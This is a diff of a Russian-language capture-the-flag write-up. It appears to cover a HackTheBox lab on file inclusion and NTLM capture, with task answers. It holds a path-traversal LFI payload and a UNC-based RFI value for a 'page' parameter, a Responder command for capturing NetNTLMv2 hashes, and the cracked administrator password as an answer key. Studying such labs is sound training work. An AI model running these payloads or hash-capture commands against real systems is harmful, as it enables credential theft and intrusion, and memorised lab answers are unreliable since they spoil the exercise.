@@ -12,6 +12,7 @@
 ### Nmap
 Запуск сканирования портов, чтобы увидеть доступные сервисы и их версии 
 <img width="625" height="233" alt="Снимок экрана 2026-06-26 в 06 40 25" src="https://github.com/user-attachments/assets/321d799b-ea8f-457d-b941-8d82e8edc7b2" />
+
 Два открытых порта, пеерключусь на 80.
 
 ### curl 
@@ -33,8 +34,36 @@ task 3: What is the name of the URL parameter which is used to load different la
 answer: page
 <img width="324" height="28" alt="Снимок экрана 2026-06-26 в 06 52 48" src="https://github.com/user-attachments/assets/05719ef2-3b73-41f0-be21-a97483f8f001" />
 
-task 4: Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"
-answer
+task 4: Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: 
+1)  "french.html",
+2)  "//10.10.14.6/somefile",
+3)  "../../../../../../../../windows/system32/drivers/etc/hosts",
+4)  "mimikatz.exe"
+answer: 3
+
+task 5: Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: 
+1)  "french.html",
+2)  "//10.10.14.6/somefile",
+3)  "../../../../../../../../windows/system32/drivers/etc/hosts",
+4)  "mimikatz.exe"
+answer: 2
+
+task 6: What does NTLM stand for? (спасибо гугл) 
+ans: New Technology Lan Manager
+
+task 7: Which flag do we use in the Responder utility to specify the network interface?
+ans: -I 
+~~~
+sudo responder -I tun0 -v
+~~~
+
+task 8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.
+ans: John the Ripper
+
+
+
+task 9: What is the password for the administrator user?
+ans: badminton
 
 
 
